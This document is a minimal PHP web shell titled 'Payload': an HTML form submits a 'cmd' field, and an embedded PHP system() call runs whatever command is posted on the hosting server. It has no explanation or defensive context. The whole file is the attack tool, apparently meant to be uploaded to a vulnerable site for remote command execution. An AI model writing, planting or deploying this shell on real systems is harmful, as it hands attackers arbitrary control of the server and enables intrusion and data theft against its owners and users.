<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">
    <form method="post">
        <input type="text" name="cmd"><br>
        <input type="submit"/>
    </form>
    <?php system($_POST['cmd']); ?>
</head>
  
</html>

